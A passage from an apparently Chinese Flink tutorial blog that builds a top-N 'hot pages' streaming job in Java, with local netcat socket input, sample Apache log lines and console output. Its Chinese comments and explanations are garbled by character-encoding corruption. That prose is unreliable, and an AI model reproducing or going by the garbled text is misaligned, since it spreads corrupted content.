DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotPages(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot pages job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰é¢„èšåˆå‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">ApacheLogEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(ApacheLogEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">merge</span><span class="params">(Long a, Long b)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„çª—å£å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountResult</span> <span class="keyword">implements</span> <span class="title">WindowFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>, <span class="title">TimeWindow</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">apply</span><span class="params">(String url, TimeWindow window, Iterable&lt;Long&gt; input, Collector&lt;PageViewCount&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      out.collect(<span class="keyword">new</span> PageViewCount(url, window.getEnd(), input.iterator().next()));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// å®ç°è‡ªå®šä¹‰çš„å¤„ç†å‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TopNHotPages</span> <span class="keyword">extends</span> <span class="title">KeyedProcessFunction</span>&lt;<span class="title">Long</span>, <span class="title">PageViewCount</span>, <span class="title">String</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer topSize;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TopNHotPages</span><span class="params">(Integer topSize)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.topSize = topSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰çŠ¶æ€ï¼Œä¿å­˜å½“å‰æ‰€æœ‰PageViewCountåˆ°listä¸­</span></span><br><span class="line">    ListState&lt;PageViewCount&gt; pageViewCountListState;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">open</span><span class="params">(Configuration parameters)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState = getRuntimeContext().getListState(<span class="keyword">new</span> ListStateDescriptor&lt;PageViewCount&gt;(<span class="string">&quot;page-count-list&quot;</span>, PageViewCount.class));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(PageViewCount value, Context ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      pageViewCountListState.add(value);</span><br><span class="line">      ctx.timerService().registerEventTimeTimer(value.getWindowEnd() + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTimer</span><span class="params">(<span class="keyword">long</span> timestamp, OnTimerContext ctx, Collector&lt;String&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      ArrayList&lt;PageViewCount&gt; pageViewCounts = Lists.newArrayList(pageViewCountListState.get().iterator());</span><br><span class="line"></span><br><span class="line">      pageViewCounts.sort((a, b) -&gt; -Long.compare(a.getCount(), b.getCount()));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ ¼å¼åŒ–æˆStringè¾“å‡º</span></span><br><span class="line">      StringBuilder resultBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;çª—å£ç»“æŸæ—¶é—´ï¼š&quot;</span>).append(<span class="keyword">new</span> Timestamp(timestamp - <span class="number">1</span>)).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// éå†åˆ—è¡¨ï¼Œå–top nè¾“å‡º</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; Math.min(topSize, pageViewCounts.size()); i++) &#123;</span><br><span class="line">        PageViewCount pageViewCount = pageViewCounts.get(i);</span><br><span class="line">        resultBuilder.append(<span class="string">&quot;NO &quot;</span>).append(i + <span class="number">1</span>).append(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          .append(<span class="string">&quot; é¡µé¢URL = &quot;</span>).append(pageViewCount.getUrl())</span><br><span class="line">          .append(<span class="string">&quot; æµè§ˆé‡ = &quot;</span>).append(pageViewCount.getCount())</span><br><span class="line">          .append(System.lineSeparator());</span><br><span class="line">      &#125;</span><br><span class="line">      resultBuilder.append(<span class="string">&quot;===============================&quot;</span>).append(System.lineSeparator());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// æ§åˆ¶è¾“å‡ºé¢‘ç‡</span></span><br><span class="line">      Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line"></span><br><span class="line">      out.collect(resultBuilder.toString());</span><br><span class="line"></span><br><span class="line">      pageViewCountListState.clear();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p> å¯åŠ¨æœ¬åœ°socket  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lk 7777</span><br></pre></td></tr></table></figure></li><li><p>åœ¨æœ¬åœ°socketè¾“å…¥æ•°æ®ï¼ŒæŸ¥çœ‹è¾“å‡º </p><ul><li><p> è¾“å…¥  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">83.149.9.216 - - 17/05/2015:10:25:49 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:50 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:51 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:52 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:55 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:56 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:57 +0000 GET /present</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:01 +0000 GET /</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:02 +0000 GET /pre</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:25:46 +0000 GET /presentations/</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:02 +0000 GET /pre</span><br><span class="line">83.149.9.216 - - 17/05/2015:10:26:03 +0000 GET /pre</span><br></pre></td></tr></table></figure></li><li><p> è¾“å‡º<br><em>ç”±äº</em><code>_onTimer_</code><em>ç®€å•ç²—æš´ç›´æ¥</em><code>_pageViewCountListState.clear();_</code><em>å¯¼è‡´å‰é¢å‡ æ¬¡æ’åä¿¡æ¯ä¸­ä¸¢å¤±ç¬¬ä¸€åä»¥å¤–çš„æ•°æ® =&gt; ä¸‹é¢ä»£ç 3-ä¹±åºæ•°æ®ä»£ç æ”¹è¿› ä¸­è§£å†³é—®é¢˜</em>  </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829549000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829550000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829551000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829552000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829555000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829556000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829557000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/present&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829561000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829562000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829546000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/presentations/&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">data&gt;</span><span class="bash"> ApacheLogEvent&#123;ip=<span class="string">&#x27;83.149.9.216&#x27;</span>, userId=<span class="string">&#x27;-&#x27;</span>, timestamp=1431829562000, method=<span class="string">&#x27;GET&#x27;</span>, url=<span class="string">&#x27;/pre&#x27;</span>&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829550000, count=2&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829555000, count=5&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/presentations/&#x27;</span>, windowEnd=1431829560000, count=7&#125;</span></span><br><span class="line"><span class="meta">agg&gt;</span><span class="bash"> PageViewCount&#123;url=<span class="string">&#x27;/present&#x27;</span>, windowEnd=1431829560000, count=2&#125;</span></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:25:50.0</span><br><span class="line">NO 1: é¡µé¢URL = /presentations/ æµè§ˆé‡ = 2</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:25:55.0</span><br><span class="line">NO 1: é¡µé¢URL = /presentations/ æµè§ˆé‡ = 5</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">============================</span><br><span class="line">çª—å£ç»“æŸæ—¶é—´ï¼š2015-05-17 10:26:00.0</span><br><span class="line">NO 1: é¡µé¢URL = /presentations/ æµè§ˆé‡ = 7</span><br><span class="line">NO 2: é¡µé¢URL = /present æµè§ˆé‡ = 2</span><br><span class="line">===============================</span><br></pre></td></tr></table></figure></li></ul></li></ul><h6 id="ä»£ç 3-ä¹±åºæ•°æ®-ä»£ç æ”¹è¿›"><a href="#ä»£ç 3-ä¹±åºæ•°æ®-ä»£ç æ”¹è¿›" class="headerlink" title="ä»£ç 3-ä¹±åºæ•°æ®-ä»£ç æ”¹è¿›"></a>ä»£ç 3-ä¹±åºæ•°æ®-ä»£ç æ”¹è¿›</h6><p><strong>ä¸€ä¸ªæ•°æ®åªæœ‰ä¸å±äºä»»ä½•çª—å£äº†ï¼Œæ‰ä¼šè¢«ä¸¢è¿›ä¾§è¾“å‡ºæµï¼</strong></p><hr><ul><li><p> javaä»£ç   </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> beans.ApacheLogEvent;</span><br><span class="line"><span class="keyword">import</span> beans.PageViewCount;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.compress.utils.Lists;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.MapState;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.common.state.MapStateDescriptor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.configuration.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.SingleOutputStreamOperator;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.KeyedProcessFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.BoundedOutOfOrdernessTimestampExtractor;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.windowing.WindowFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.assigners.SlidingEventTimeWindows;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.Time;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.windows.TimeWindow;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.runtime.operators.util.AssignerWithPeriodicWatermarksAdapter;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.Collector;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.OutputTag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.Timestamp;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/5 1:27 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HotPages</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ–‡ä»¶ï¼Œè½¬æ¢æˆPOJO</span></span><br><span class="line">    <span class="comment">//        URL resource = HotPages.class.getResource(&quot;/apache.log&quot;);</span></span><br><span class="line">    <span class="comment">//        DataStream&lt;String&gt; inputStream = env.readTextFile(resource.getPath());</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ–¹ä¾¿æµ‹è¯•ï¼Œä½¿ç”¨æœ¬åœ°Socketè¾“å…¥æ•°æ®</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.socketTextStream(<span class="string">&quot;localhost&quot;</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DataStream&lt;ApacheLogEvent&gt; dataStream = inputStream</span><br><span class="line">      .map(line -&gt; &#123;</span><br><span class="line">        String[] fields = line.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        SimpleDateFormat simpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">&quot;dd/MM/yyyy:HH:mm:ss&quot;</span>);</span><br><span class="line">        Long timestamp = simpleDateFormat.parse(fields[<span class="number">3</span>]).getTime();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ApacheLogEvent(fields[<span class="number">0</span>], fields[<span class="number">1</span>], timestamp, fields[<span class="number">5</span>], fields[<span class="number">6</span>]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .assignTimestampsAndWatermarks(<span class="keyword">new</span> AssignerWithPeriodicWatermarksAdapter.Strategy&lt;&gt;(</span><br><span class="line">        <span class="keyword">new</span> BoundedOutOfOrdernessTimestampExtractor&lt;ApacheLogEvent&gt;(Time.of(<span class="number">1</span>, TimeUnit.SECONDS)) &#123;</span><br><span class="line">          <span class="meta">@Override</span></span><br><span class="line">          <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">extractTimestamp</span><span class="params">(ApacheLogEvent element)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> element.getTimestamp();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      ));</span><br><span class="line"></span><br><span class="line">    dataStream.print(<span class="string">&quot;data&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰ä¸€ä¸ªä¾§è¾“å‡ºæµæ ‡ç­¾</span></span><br><span class="line">    OutputTag&lt;ApacheLogEvent&gt; lateTag = <span class="keyword">new</span> OutputTag&lt;ApacheLogEvent&gt;(<span class="string">&quot;late&quot;</span>) &#123;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// åˆ†ç»„å¼€çª—èšåˆ</span></span><br><span class="line">    SingleOutputStreamOperator&lt;PageViewCount&gt; windowAggStream = dataStream</span><br><span class="line">      <span class="comment">// è¿‡æ»¤getè¯·æ±‚</span></span><br><span class="line">      .filter(data -&gt; <span class="string">&quot;GET&quot;</span>.equals(data.getMethod()))</span><br><span class="line">      .filter(data -&gt; &#123;</span><br><span class="line">        String regex = <span class="string">&quot;^((?!\\.(css|js|png|ico)$).)*$&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> Pattern.matches(regex, data.getUrl());</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="comment">// æŒ‰ç…§urlåˆ†ç»„</span></span><br><span class="line">      .keyBy(ApacheLogEvent::getUrl)</span><br><span class="line">      .window(SlidingEventTimeWindows.of(Time.minutes(<span class="number">10</span>), Time.seconds(<span class="number">5</span>)))</span><br><span class="line">      .allowedLateness(Time.minutes(<span class="number">1</span>))</span><br><span class="line">      .sideOutputLateData(lateTag)</span><br><span class="line">      .aggregate(<span class="keyword">new</span> PageCountAgg(), <span class="keyword">new</span> PageCountResult());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    windowAggStream.print(<span class="string">&quot;agg&quot;</span>);</span><br><span class="line">    windowAggStream.getSideOutput(lateTag).print(<span class="string">&quot;late&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ”¶é›†åŒä¸€çª—å£countæ•°æ®ï¼Œæ’åºè¾“å‡º</span></span><br><span class="line">    DataStream&lt;String&gt; resultStream = windowAggStream</span><br><span class="line">      .keyBy(PageViewCount::getWindowEnd)</span><br><span class="line">      .process(<span class="keyword">new</span> TopNHotPages(<span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    resultStream.print();</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot;hot pages job&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// è‡ªå®šä¹‰é¢„èšåˆå‡½æ•°</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PageCountAgg</span> <span class="keyword">implements</span> <span class="title">AggregateFunction</span>&lt;<span class="title">ApacheLogEvent</span>, <span class="title">Long</span>, <span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">add</span><span class="params">(ApacheLogEvent value, Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getResult</span><span class="params">(Long accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> 